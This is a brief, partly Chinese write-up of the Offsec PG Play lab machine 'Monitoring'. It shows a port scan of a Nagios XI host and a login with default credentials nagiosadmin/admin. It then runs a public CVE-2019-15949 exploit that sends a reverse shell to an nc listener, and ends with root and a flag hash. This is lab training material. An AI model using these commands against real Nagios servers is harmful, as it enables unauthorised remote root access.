###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Monitoring(未完成)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.211.136 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.211.136:25
Open 192.168.211.136:80
Open 192.168.211.136:5667
Open 192.168.211.136:22
Open 192.168.211.136:443
Open 192.168.211.136:389

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       syn-ack Postfix smtpd
80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8E1494DD4BFF0FC523A2E2A15ED59D84
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
| Issuer: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
5667/tcp open  tcpwrapped syn-ack
```

透過80port可看到login頁面，利用[帳號nagiosadmin密碼admin](https://support.nagios.com/forum/viewtopic.php?t=544)可登入頁面

下載[CVE-2019–15949](https://github.com/hadrian3689/nagiosxi_5.6.6)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/pgplay/MACHINE/Monitoring/nagiosxi_5.6.6]
└─$ python3 exploit.py -t 'http://192.168.191.136' -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.235 -lp 4444
```

直接得root
```
root@ubuntu:~# cat proof.txt
d7dea0d6b4e94f056e4b5f46a685e285
```
